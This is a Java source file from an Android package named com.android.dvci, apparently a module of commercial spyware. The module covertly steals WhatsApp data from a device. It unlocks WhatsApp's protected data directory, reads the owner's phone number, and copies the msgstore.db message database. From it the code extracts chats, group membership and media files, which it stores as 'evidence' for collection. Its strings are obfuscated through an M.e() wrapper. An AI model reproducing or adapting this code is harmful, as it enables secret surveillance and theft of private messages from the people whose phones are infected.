package com.android.dvci.module.chat;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.util.ArrayList;
import java.util.Date;
import java.util.Formatter;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;

import com.android.dvci.RunningProcesses;
import com.android.dvci.auto.Cfg;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.file.Path;
import com.android.dvci.module.MessageChatMultimedia;
import com.android.dvci.module.ModuleAddressBook;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;
import com.whatsapp.MediaData;

public class ChatWhatsapp extends SubModuleChat {
	private static final String TAG = "ChatWhatsapp";

	ChatGroups groups = new ChatWhatsappGroups();

	private static final int PROGRAM = 0x06;

	private static final String DEFAULT_LOCAL_NUMBER = "local";
	String pObserving = M.e("com.whatsapp");

	private String myPhoneNumber = DEFAULT_LOCAL_NUMBER;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	@Override
	int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification stop)");
		}

		try {
			readChatWhatsappMessages();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}
	}

	/**
	 * Estrae dal file RegisterPhone.xml il numero di telefono
	 * 
	 * @return
	 */
	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}

		try {
			myPhoneNumber = readMyPhoneNumber();

			if (DEFAULT_LOCAL_NUMBER.equals(myPhoneNumber)) {
				enabled = false;
				return;
			}

			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);

			RunningProcesses runningProcesses = RunningProcesses.self();
			if(!runningProcesses.getForeground_wrapper().equals(pObserving)) {
				readChatWhatsappMessages();
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart), " + e);
			}
		}

	}

	private String readMyPhoneNumber() {
		String myPhone = DEFAULT_LOCAL_NUMBER;
		String myCountryCode = "";

		String filename = M.e("/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml");
		try {
			Path.unprotect(filename, 2, true);
			File file = new File(filename);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber): " + file.getAbsolutePath());
			}

			Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
			// Element root = doc.getDocumentElement();
			// root.getElementsByTagName("string");

			doc.getDocumentElement().normalize();
			NodeList stringNodes = doc.getElementsByTagName("string");

			for (int i = 0; i < stringNodes.getLength(); i++) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), node: " + i);
				}
				Node node = stringNodes.item(i);
				NamedNodeMap attrs = node.getAttributes();
				Node item = attrs.getNamedItem("name");
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), item: " + item.getNodeName() + " = " + item.getNodeValue());
				}
				// f_e=com.whatsapp.RegisterPhone.phone_number
				if (item != null && M.e("com.whatsapp.RegisterPhone.phone_number").equals(item.getNodeValue())) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readMyPhoneNumber), found number: " + item);
					}
					myPhone = node.getFirstChild().getNodeValue();
				}

				if (item != null && M.e("com.whatsapp.RegisterPhone.country_code").equals(item.getNodeValue())) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readMyPhoneNumber), found country code: " + item);
					}
					myCountryCode = "+" + node.getFirstChild().getNodeValue();
				}
			}

		} catch (Exception e) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber), ERROR: " + e);
			}
		}

		return myCountryCode + myPhone;
	}

	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
	// chat_list,messages where chat_list.key_remote_jid =
	// messages.key_remote_jid

	/**
	 * Apre msgstore.db, estrae le conversazioni. Per ogni conversazione legge i
	 * messaggi relativi
	 * 
	 * @throws IOException
	 */
	private void readChatWhatsappMessages() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages), semaphore red");
			}
			return;
		}

		try {

			long lastWhatsapp = markup.unserialize(new Long(0));

			boolean updateMarkup = false;

			// f.0=/data/data/com.whatsapp/databases
			String dbDir = M.e("/data/data/com.whatsapp/databases");
			// f.1=/msgstore.db
			String dbFile = M.e("/msgstore.db");

			if (Path.unprotect(dbDir, dbFile, true)) {

				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatWhatsappMessages): can read DB");
				}
				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
				if (helper == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readChatWhatsappMessages) Error, file not readable: " + dbFile);
					}
					return;
				}
				try {
					// retrieve a list of all the conversation changed from the last
					// reading. Each conversation contains the peer and the last id
					ArrayList<String> changedConversations = fetchConversation(helper, lastWhatsapp);
					// helper.disposeDb();

					// helper = GenericSqliteHelper.open(dbDir, dbFile);
					// for every conversation, fetch and save message and update
					// markup

					long newLastRead = lastWhatsapp;
					for (String conversation : changedConversations) {
						try {
							if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
								fetchGroup(helper, conversation);
							}

							long conversationLastRead = fetchMessages(helper, conversation, lastWhatsapp);
							newLastRead = Math.max(conversationLastRead, newLastRead);

							if (Cfg.DEBUG) {
								Check.log(TAG + " (readChatWhatsappMessages): fetchMessages " + conversation
										+ " newLastRead " + newLastRead);
							}
						}catch(Exception ex){
							if (Cfg.DEBUG) {
								Check.log(TAG + " (readChatWhatsappMessages): fetchMessages " + ex);
							}
						}
					}

					if (newLastRead > lastWhatsapp) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (readChatWhatsappMessages): updating markup");
						}
						markup.writeMarkupSerializable(newLastRead);
					}
				}finally {
					helper.disposeDb();
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
				}
			}
		} finally {
			readChatSemaphore.release();
		}
	}

	private void fetchGroup(GenericSqliteHelper helper, final String conversation) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchGroup) : " + conversation);
		}

		// SELECT _id,remote_resource where key_remote_jid=1
		// f.4=_id
		// f.5=key_remote_jid
		// f_f=remote_resources
		String[] projection = {  M.e("remote_resource") };
		String selection = M.e("key_remote_jid") + "='" + conversation + "'";

		// final Set<String> remotes = new HashSet<String>();
		groups.addPeerToGroup(conversation, clean(myPhoneNumber));
		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				//int id = cursor.getInt(0);
				String remote = cursor.getString(0);
				// remotes.add(remote);
				if (remote != null) {
					groups.addPeerToGroup(conversation, clean(remote));
				}
				return 0;
			}
		};

		helper.traverseRecords(M.e("messages"), visitor, true);

	}
	private class FetchConversationRecordVisitor extends RecordVisitor {
		long lastRead =0;
		ArrayList<String> changedConversations = new ArrayList<String>();
		private FetchConversationRecordVisitor(long lr,String[] projection, String selection, String order) {
			super(projection, selection, order);
			lastRead = lr;

		}


		@Override
		public long cursor(Cursor cursor) {
			// f.5=key_remote_jid
			String jid = cursor.getString(cursor.getColumnIndexOrThrow(M.e("key_remote_jid")));
			// f.6=message_table_id
			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(M.e("message_table_id")));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
			}

			int lastReadIndex = 0;
			// if there's something new, fetch new messages and update
			// markup
			if (lastReadIndex < mid) {
				changedConversations.add(jid);
			}
			return lastRead;
		}

		public ArrayList<String> getChangedConversations() {
			return changedConversations;
		}
	}
	/**
	 * Retrieves the list of the conversations and their last read message.
	 *
	 * @param helper
	 * @return
	 */
	private ArrayList<String> fetchConversation(GenericSqliteHelper helper , long lastWhatsapp) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchChangedConversation)");
		}
		// f.3=chat_list
		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("message_table_id") };
		//StringUtils.split(M.e("_id,keyr") )
		// queryBuilder.appendWhere(inWhere);
		// f.4=_id
		// f.5=key_remote_jid
		// f.6=message_table_id
		FetchConversationRecordVisitor fcsrv = new FetchConversationRecordVisitor(lastWhatsapp,projection,M.e("sort_timestamp > ") + lastWhatsapp,M.e("sort_timestamp ASC"));
		lastWhatsapp = helper.traverseRecords(M.e("chat_list") , fcsrv);
		return fcsrv.getChangedConversations();
	}

	private class FetchMessagesRecordVisitor extends RecordVisitor {
		long lastRead =0;
		String peer = "";
		private ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
		private ArrayList<MessageChatMultimedia> multimedias = new ArrayList<MessageChatMultimedia>();
		private FetchMessagesRecordVisitor(String peer,long lr,String[] projection, String selection, String order) {
			super(projection, selection, order);
			lastRead = lr;
			this.peer = peer;
		}


		@Override
		public long cursor(Cursor cursor) {
			boolean is_mm = false;
			int index = cursor.getInt(0); // f_4
			String conversation = cursor.getString(1); // f_7
			String message = cursor.getString(2); // f_7
			Long timestamp = cursor.getLong(3); // f_b
			boolean incoming = cursor.getInt(4) != 1; // f_
			String remote = clean(cursor.getString(5));
			/* media part */
			/*
			 * media_mime_type          TEXT,
			 * media_wa_type            TEXT,
			 * media_caption            TEXT,
			 * thumb_image              TEXT,
			 * raw_data                 BLOB,
			 **/

			String mm_wa_type_str = cursor.getString(7);
			int mm_wa_type = 0;
			if(mm_wa_type_str != null){
				try {
					mm_wa_type = Integer.parseInt(mm_wa_type_str);
				}catch (Exception e){
					if (Cfg.DEBUG) {
						Check.log(TAG + " (fetchMessages) Error parsingInt: " + mm_wa_type_str +"\n"+ e);
					}
					mm_wa_type = 0;
				}
			}
			String mm_mime = "";
			byte[] mm_serialize_obj = null;
			byte[] mm_jpeg_thumb = null;
			int mm_size = 0;
			String mm_media_caption = "";
			try {
				mm_mime = cursor.getString(6);
				mm_serialize_obj = cursor.getBlob(9);
				mm_jpeg_thumb = cursor.getBlob(10);
				mm_media_caption = cursor.getString(8);
				mm_size = cursor.getInt(11);
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchMessages) Error getting mm: " + e);
				}
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + message);
			}
			lastRead = Math.max(timestamp, lastRead);

			/* it can be a multimedia message , don't skip it only for message == empty*/
			if (StringUtils.isEmpty(message) && (mm_wa_type<1 || mm_wa_type > 4) ) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchMessages), empty message");
				}
				return lastRead;
			}
			if((mm_wa_type>=1 && mm_wa_type <= 3)){
				is_mm = true;
			}

			if (Cfg.DEBUG) {
				// Check.log(TAG + " (fetchMessages): " +
				// StringUtils.byteArrayToHexString(message.getBytes()));
			}

			String from = incoming ? peer : myPhoneNumber;
			String to = incoming ? myPhoneNumber : peer;

			// if (groups.isGroup(peer)) {
			// to = groups.getGroupTo(from, peer);
			// }

			if (groups.isGroup(peer)) {
				if (incoming) {
					from = remote;
				} else {
					// to = groups.getGroupTo(from, peer);
				}
				to = groups.getGroupToName(from, peer);
			}

			if (to != null && from != null && message != null) {
				messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, message, incoming));
			} else if (is_mm && to != null && from != null && mm_serialize_obj != null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchMessages) multimedia");
				}
				try{
					MediaData wamd = byteToWhatsappMediaData(mm_serialize_obj);
					if (wamd != null && wamd.getFile()!=null && wamd.getFile().canRead() ) {
						multimedias.add(new MessageChatMultimedia(PROGRAM, new Date(timestamp), from, to, incoming, mm_media_caption, mm_mime, wamd.getFile(),mm_size));
						if(mm_media_caption!=null){
							messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, mm_media_caption, incoming));
						}
					}else{
						if (Cfg.DEBUG) {
							Check.log(TAG + " (fetchMessages) skipping malformed multimedia");
						}
					}
				}catch (Exception e){
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " (fetchMessages) Error: " + e);
					}
				}

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchMessages) Error, null values");
				}
			}

			return lastRead;
		}

		public ArrayList<MessageChat> getMessages() {
			return messages;
		}

		public ArrayList<MessageChatMultimedia> getMultimedias() {
			return multimedias;
		}
	}
	/**
	 * Fetch unread messages of a specific conversation
	 * 
	 * @param helper
	 * @param conversation
	 * @return
	 */
	private long fetchMessages(GenericSqliteHelper helper , String conversation, long lastWhatsapp) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchMessages): " + conversation + " : lsw" + lastWhatsapp);
		}
		String peer = clean(conversation);
		String selection = M.e(" key_remote_jid = '") + conversation + M.e("' AND timestamp > ")+lastWhatsapp ;

		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"),M.e("remote_resource"),
				M.e("media_mime_type"), M.e("media_wa_type"), M.e("media_caption"),M.e("thumb_image"), M.e("raw_data"),M.e("media_size")
		};
		long lastRead = lastWhatsapp;
		FetchMessagesRecordVisitor fmsrv = new FetchMessagesRecordVisitor(peer,lastRead,projection,selection,M.e("timestamp"));
		lastRead = helper.traverseRecords(M.e("messages"), fmsrv);
		getModule().saveEvidence(fmsrv.getMessages());
		getModule().saveEvidenceMultimedia(fmsrv.getMultimedias());
		fmsrv = null;
		System.gc();
		return lastRead;
	}

	private String clean(String remote) {
		if (remote == null) {
			return null;
		}
		// f_9=@s.whatsapp.net
		return remote.replaceAll(M.e("@s.whatsapp.net"), "");
	}
	
	public class ChatWhatsappGroups extends ChatGroups {
		@Override
		boolean isGroup(String peer) {
			return peer.contains("@g.");
		}

	}

	/* Feature: Chat Multimedia
	 * Description:
	 *    Extracts from the chat the multimedia files and report an evidence
	 *    with it's filepath.
	 *    0xC6C9 => :CHATMM, # chat multimedia
	 * Fields:
	 *    struct time
	 *    program
	 *    flags
	 *    to
	 *    to_display
	 *    from
	 *    from_display
	 *    mime
	 *    filename
	 *
	 * DB analysis:
	 * Media related fields and index:
	 * FIELDS:
	 * media_mime_type = TEXT , example image/jpeg,audio/aac,video/mp4
	 *  availability only with media
	 * media_wa_type = INTEGER , example 0=text 1=img, 2=audio 3=video
	 *  availability always
	 * media_size = INTEGER
	 *  availability only with media
	 * media_name = TEXT
	 *  availability only with media
	 * media_hash = TEXT
	 *  availability only with media , some kind of base64 originated from an unknown
	 *  hash source
	 * media_caption = TEXT
	 *  availability only with media and if inserted
	 * thumb_image = TEXT serialized obj , byte array
	 *  availability only with media
	 * raw_data = BLOB of jpeg
	 *  availability only with media IMG and VIDEO
	 *
	 *  INDEXES:
	 *  ID                  |FIELD
	 *  media_type_index    |media_wa_type
	 *  media_hash_index    |media_hash
	 */


	public MediaData byteToWhatsappMediaData(byte[] bytes) {
		if (bytes == null)
			return null;
		MediaData object = null;
		try {
			ObjectInputStream objectInputStream = new ObjectInputStream( new ByteArrayInputStream(bytes) );
			object = (MediaData)objectInputStream.readObject();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Formatter formatter = new Formatter();
				for (byte b : bytes) {
					formatter.format("%02x", b);
				}
				String hex = formatter.toString();
				Check.log(TAG + " (stringToWhatsappMediaData) Error: " + hex);
			}
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		} catch (ClassCastException e) {
			e.printStackTrace();
		}
		return object;
	}
	/*
		 * deserialized with : https://code.google.com/p/jdeserialize/
		 * this class is used to deserialize the serialized object in
		 *
		 */


}
